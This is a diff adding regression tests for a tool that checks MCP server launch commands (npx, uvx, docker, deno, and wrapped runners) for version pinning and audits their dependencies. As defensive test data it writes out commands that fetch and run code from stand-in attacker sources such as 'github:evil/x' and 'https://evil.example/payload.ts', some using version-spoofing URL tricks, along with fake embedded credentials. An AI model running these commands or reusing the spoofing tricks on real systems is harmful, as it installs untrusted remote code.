@@ -139,6 +139,39 @@ def test_uv_tool_run_reads_with_requirements_too() -> None:
     )
 
 
+@pytest.mark.parametrize(
+    ("config", "specs"),
+    [
+        ({"command": "uvx", "args": ["-w", "dep==1.0.0", "server-tool"]}, ("server-tool", "dep==1.0.0")),
+        ({"command": "uv", "args": ["tool", "run", "-w", "dep==1.0.0", "server-tool"]}, ("server-tool", "dep==1.0.0")),
+        (
+            {"command": "uvx", "args": ["-w", "floating-dep", "server-tool==1.0.0"]},
+            ("server-tool==1.0.0", "floating-dep"),
+        ),
+        ({"command": "uvx", "args": ["-b", "constraints.txt", "-C", "k=v", "srv==1.0"]}, ("srv==1.0",)),
+    ],
+)
+def test_uvx_short_options_are_read_like_their_long_forms(config: dict[str, Any], specs: tuple[str, ...]) -> None:
+    """Regression: '-w' (--with), '-b', and '-C' were read as switches, so their value became the package."""
+    invocation = parse_mcp_runner(config)
+    assert invocation is not None and invocation.specs == specs
+    assert classify_mcp_pinning(config).status == ("pinned" if specs == ("srv==1.0",) else "unpinned")
+
+
+def test_uvx_with_requirements_file_is_unpinned() -> None:
+    """Regression: the packages of '--with-requirements reqs.txt' were never checked, yet the server was pinned."""
+    config = {"command": "uvx", "args": ["--with-requirements", "reqs.txt", "mcp-server==1.0.0"]}
+
+    invocation = parse_mcp_runner(config)
+    pin = classify_mcp_pinning(config)
+
+    assert invocation is not None and invocation.requirement_files == ("reqs.txt",)
+    assert (pin.status, pin.detail) == (
+        "unpinned",
+        "uvx: the packages of '--with-requirements reqs.txt' are not read, so they cannot be checked",
+    )
+
+
 # --------------------------------------------------------------------------- #
 # A runner's options end at the package it runs                               #
 # --------------------------------------------------------------------------- #
@@ -179,6 +212,47 @@ def test_npm_exec_reads_its_options_until_the_separator(args: list[str], specs: 
     invocation = parse_mcp_runner({"command": "npm", "args": args})
     assert invocation is not None
     assert invocation.specs == specs
+
+
+@pytest.mark.parametrize(
+    ("args", "specs"),
+    [
+        # npm options that take a value: the word after them is not the package.
+        (["--globalconfig", "x@1.0.0", "-p", "github:evil/x", "x-cmd"], ("github:evil/x",)),
+        (["--node-options", "x@1.0.0", "--package", "some-floating-pkg", "x-cmd"], ("some-floating-pkg",)),
+        (["--loglevel", "silent", "pkg@1.2.3", "-p", "3000"], ("pkg@1.2.3",)),
+        # An option the reader does not know: npx gives it the next word as its value, npm reads it as a
+        # switch, so that word may be the package too.
+        (["--some-new-option", "x@1.0.0", "-p", "github:evil/x", "x-cmd"], ("github:evil/x", "x@1.0.0")),
+        (["--some-new-switch", "pkg"], ("pkg",)),
+        (["--no-yes", "pkg@1.2.3", "-p", "3000"], ("3000", "pkg@1.2.3")),
+        # npm switches take no value.
+        (["-y", "--prefer-offline", "-q", "pkg@1.2.3", "-p", "3000"], ("pkg@1.2.3",)),
+    ],
+)
+def test_npx_reads_its_options_the_way_npx_does(args: list[str], specs: tuple[str, ...]) -> None:
+    """Regression: an npm value option missing from the table ('--globalconfig x@1.0.0') was read as a switch, so
+    its value became the package and a later '-p <floating spec>' was never checked or audited."""
+    invocation = parse_mcp_runner({"command": "npx", "args": args})
+    assert invocation is not None
+    assert invocation.specs == specs
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ["--globalconfig", "x@1.0.0", "-p", "github:evil/x", "x-cmd"],
+        ["--node-options", "x@1.0.0", "--package", "some-floating-pkg", "x-cmd"],
+        ["--some-new-option", "x@1.0.0", "-p", "github:evil/x", "x-cmd"],
+    ],
+)
+def test_npx_package_after_an_option_value_is_pin_checked(args: list[str]) -> None:
+    assert classify_mcp_pinning({"command": "npx", "args": args}).status == "unpinned"
+
+
+def test_npm_exec_reads_a_value_option_before_the_package() -> None:
+    invocation = parse_mcp_runner({"command": "npm", "args": ["exec", "--globalconfig", "x@1.0.0", "x-cmd"]})
+    assert invocation is not None and invocation.specs == ("x-cmd",)
 
 
 def test_server_port_flag_keeps_an_exact_npx_package_pinned() -> None:
@@ -249,6 +323,80 @@ def test_pinning_reads_a_runner_path_with_spaces() -> None:
     compose = classify_mcp_pinning({"command": _DOCKER_WITH_SPACES, "args": ["compose", "up"]})
     assert (compose.status, compose.detail) == ("not_applicable", "docker invocation is not 'run'")
     assert mcp_container_image({"command": _DOCKER_WITH_SPACES, "args": ["run", "-i", "img:1.2.3"]}) == "img:1.2.3"
+
+
+@pytest.mark.parametrize(
+    ("config", "expected"),
+    [
+        (
+            {"command": "npx -y @modelcontextprotocol/server-filesystem /home/user/src/docker"},
+            ("npm", "npx", ("@modelcontextprotocol/server-filesystem",)),
+        ),
+        ({"command": "npx -y github:evil/npx", "args": ["left-pad@1.3.0"]}, ("npm", "npx", ("github:evil/npx",))),
+        ({"command": "docker run --rm -i ghcr.io/acme/docker"}, ("container", "docker run", ("ghcr.io/acme/docker",))),
+        (
+            {"command": "uvx --from git+https://github.com/evil/uvx", "args": ["pkg==1.0"]},
+            ("pypi", "uvx", ("git+https://github.com/evil/uvx",)),
+        ),
+    ],
+)
+def test_a_command_line_is_read_by_its_first_word(config: dict[str, Any], expected: tuple) -> None:
+    """Regression: a command line whose last path segment named a runner ('.../docker', 'github:evil/npx') was
+    read as one program of that name, so pinning, the image lookup, and the audit read the wrong program."""
+    invocation = parse_mcp_runner(config)
+    assert invocation is not None
+    assert (invocation.ecosystem, invocation.runner, invocation.specs) == expected
+    assert classify_mcp_pinning(config).status == "unpinned"
+
+
+@pytest.mark.parametrize(
+    ("command", "program"),
+    [("node ./server.js --data /srv/docker", "node"), ("./bin/serve --cache-dir /opt/cache/uvx", "serve")],
+)
+def test_a_command_line_that_only_ends_in_a_runner_path_is_not_that_runner(command: str, program: str) -> None:
+    pin = classify_mcp_pinning({"command": command})
+    assert (pin.status, pin.detail) == ("not_applicable", f"local interpreter, script, or binary ({program!r})")
+
+
+# --------------------------------------------------------------------------- #
+# A wrapper such as env, nohup, or timeout is looked through                  #
+# --------------------------------------------------------------------------- #
+@pytest.mark.parametrize(
+    ("config", "expected"),
+    [
+        (
+            {"command": "env", "args": ["NODE_ENV=production", "npx", "-y", "some-mcp-server"]},
+            ("npm", "npx", ("some-mcp-server",)),
+        ),
+        ({"command": "/usr/bin/env", "args": ["npx", "-y", "some-mcp-server"]}, ("npm", "npx", ("some-mcp-server",))),
+        (
+            {"command": "env", "args": ["-i", "PATH=/usr/bin", "uvx", "mcp-server-fetch"]},
+            ("pypi", "uvx", ("mcp-server-fetch",)),
+        ),
+        ({"command": "env -u HOME npx -y some-mcp-server"}, ("npm", "npx", ("some-mcp-server",))),
+        ({"command": "env", "args": ["docker", "run", "img"]}, ("container", "docker run", ("img",))),
+        ({"command": "nohup", "args": ["npx", "-y", "pkg"]}, ("npm", "npx", ("pkg",))),
+        ({"command": "timeout", "args": ["-s", "KILL", "600", "uvx", "pkg"]}, ("pypi", "uvx", ("pkg",))),
+        ({"command": "nice", "args": ["-n", "10", "npx", "pkg"]}, ("npm", "npx", ("pkg",))),
+        ({"command": "stdbuf", "args": ["-o", "L", "npx", "pkg"]}, ("npm", "npx", ("pkg",))),
+        ({"command": "setsid", "args": ["-f", "time", "-p", "npx", "pkg"]}, ("npm", "npx", ("pkg",))),
+        ({"command": "sudo", "args": ["-u", "app", "-E", "MODE=1", "npx", "pkg"]}, ("npm", "npx", ("pkg",))),
+        ({"command": "doas", "args": ["-u", "app", "env", "nohup", "npx", "pkg"]}, ("npm", "npx", ("pkg",))),
+    ],
+)
+def test_a_wrapped_runner_is_read_through_its_wrapper(config: dict[str, Any], expected: tuple) -> None:
+    """Regression: 'env ... npx -y pkg' was a local binary ('env'), so pinning, the image lookup, and the audit
+    skipped the package that the wrapped runner installs."""
+    invocation = parse_mcp_runner(config)
+    assert invocation is not None
+    assert (invocation.ecosystem, invocation.runner, invocation.specs) == expected
+    assert classify_mcp_pinning(config).status == "unpinned"
+
+
+@pytest.mark.parametrize("command", ["env", "nohup", "timeout"])
+def test_a_wrapper_that_runs_nothing_is_a_local_binary(command: str) -> None:
+    pin = classify_mcp_pinning({"command": command, "args": ["60"] if command == "timeout" else []})
+    assert (pin.status, pin.detail) == ("not_applicable", f"local interpreter, script, or binary ({command!r})")
 
 
 # --------------------------------------------------------------------------- #
@@ -392,6 +540,35 @@ def test_hook_remote_code_follows_the_field_not_the_detail_wording(tmp_path: Pat
     assert "plugin_hook_remote_code" in _hook_checks(tmp_path / "git", "npx -y github:user/repo")
 
 
+@pytest.mark.parametrize(
+    "module",
+    [
+        "https://deno.land/x/mod@v1.2.3/mod.ts",
+        "https://deno.land/std@0.224.0/http/file_server.ts",
+        "https://esm.sh/preact@10.19.2",
+    ],
+)
+def test_deno_remote_module_with_a_version_in_its_path_is_pinned(module: str) -> None:
+    assert classify_mcp_pinning({"command": "deno", "args": ["run", "-A", module]}).status == "pinned"
+
+
+@pytest.mark.parametrize(
+    "module",
+    [
+        "https://evil.example/payload.ts#@1.0.0",
+        "https://evil.example/payload.ts?v=@1.0.0",
+        "https://evil.example/@1.0.0/../payload.ts",
+        "https://evil.example/@1.0.0/%2e%2e/payload.ts",
+        "https://evil.example/x@1.0.0/./../payload.ts",
+    ],
+)
+def test_deno_module_version_counts_only_in_the_path_the_server_reads(tmp_path: Path, module: str) -> None:
+    """Regression: '@1.0.0' anywhere in the URL, even in the query, the fragment, or a '..' segment that the client
+    resolves away, made an arbitrary remote module pinned, and the hook lost its CRITICAL remote-code finding."""
+    assert classify_mcp_pinning({"command": "deno", "args": ["run", "-A", module]}).status == "unpinned"
+    assert "plugin_hook_remote_code" in _hook_checks(tmp_path, f"deno run -A {module}")
+
+
 # --------------------------------------------------------------------------- #
 # The audit reads the same specs                                              #
 # --------------------------------------------------------------------------- #
@@ -470,6 +647,51 @@ def test_audit_reads_runner_paths_with_spaces(tmp_path: Path, pip_audit: _FakeTo
     assert packages["node_modules/lodash"] == {"version": "4.17.20"}
     [pip_call] = pip_audit.calls
     assert pip_call["files"] == {"requirements-0.txt": "mcp-server-fetch==2024.11.25\n"}
+
+
+def test_audit_reads_a_runner_through_its_wrapper(tmp_path: Path, pip_audit: _FakeTool, osv_scanner: _FakeTool) -> None:
+    """Regression: 'env NODE_ENV=production npx -y pkg' was a local binary, so its package was never audited."""
+    servers = {
+        "web": {"command": "env", "args": ["NODE_ENV=production", "npx", "-y", "lodash@4.17.20"]},
+        "py": {"command": "nohup", "args": ["uvx", "mcp-server-fetch==2024.11.25"]},
+    }
+    _audit(tmp_path / "demo", servers)
+
+    [npm_call] = osv_scanner.calls
+    packages = json.loads(npm_call["files"]["package-lock.json"])["packages"]
+    assert packages["node_modules/lodash"] == {"version": "4.17.20"}
+    [pip_call] = pip_audit.calls
+    assert pip_call["files"] == {"requirements-0.txt": "mcp-server-fetch==2024.11.25\n"}
+
+
+def test_audit_reports_a_uvx_requirements_file_as_unverified(tmp_path: Path, pip_audit: _FakeTool) -> None:
+    server = {"command": "uvx", "args": ["--with-requirements", "reqs.txt", "mcp-server==1.0.0"]}
+    result = _audit(tmp_path / "demo", {"srv": server})
+
+    [call] = pip_audit.calls
+    assert call["files"] == {"requirements-0.txt": "mcp-server==1.0.0\n"}
+    unverified = [
+        f.metadata["declared_constraint"] for f in result.findings if f.check_name == "dependency-version-unverified"
+    ]
+    assert unverified == ["--with-requirements reqs.txt"]
+
+
+def test_audit_findings_never_echo_a_credential_in_a_runner_spec(
+    tmp_path: Path, pip_audit: _FakeTool, osv_scanner: _FakeTool
+) -> None:
+    """Regression: dependency-version-unverified quoted a git spec's userinfo in its message and metadata."""
+    token = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
+    servers = {
+        "a": {"command": "npx", "args": ["-y", f"git+https://x-access-token:{token}@github.com/org/repo.git"]},
+        "b": {"command": "uvx", "args": ["--from", "git+https://oauth2:hunter2pass@gitlab.example.com/o/r.git", "t"]},
+    }
+    result = _audit(tmp_path / "demo", servers)
+
+    unverified = [f for f in result.findings if f.check_name == "dependency-version-unverified"]
+    assert len(unverified) == 2
+    dumped = json.dumps([(f.message, f.metadata) for f in result.findings], default=str)
+    assert token not in dumped and "hunter2pass" not in dumped
+    assert "git+https://gitlab.example.com/o/r.git" in dumped
 
 
 def test_pip_audit_gets_every_exact_pep440_spelling_as_name_equals_version(
